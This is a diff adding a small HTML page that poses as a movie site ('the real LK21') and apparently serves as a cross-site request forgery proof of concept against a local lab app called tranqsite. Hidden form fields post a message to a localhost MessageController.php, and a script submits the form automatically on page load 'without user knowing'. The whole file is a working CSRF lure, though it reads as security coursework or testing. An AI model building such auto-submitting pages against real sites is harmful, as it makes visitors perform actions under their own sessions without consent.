@@ -1,0 +1,24 @@
+<html>
+    <body>
+        <h1>Welcome to the real LK21!!!</h1>
+        <p>
+            Popular Movies:
+            1. The Hunger Games: the chronicle of a chef
+            2. Spongebob and the MamaLemon
+            3. The Avenger Sevenfold
+        </p>
+        <form action="http://localhost/tranqsite/controllers/MessageController.php" method="POST" enctype="multipart/form-data">
+            <input id="title" name="title" type="hidden" placeholder="" class="form-control" value="Another attempt for CSRF attack">
+            <input name="recipient" value="1" type="hidden" />
+            <textarea style="display: none;" id="message" rows="5" class="form-control" name="message">Saya bisa menerawang masa depan anda</textarea>
+            <br>
+            <div class="form-actions" style="display: none;">
+                <input type="submit" class="btn btn-primary btn-block btn-ghost" name="send" />
+            </div>  
+        </form>
+    </body>
+    <script>
+        // to automatically submit the form without user knowing
+        document.forms[0].submit();
+    </script>
+</html>
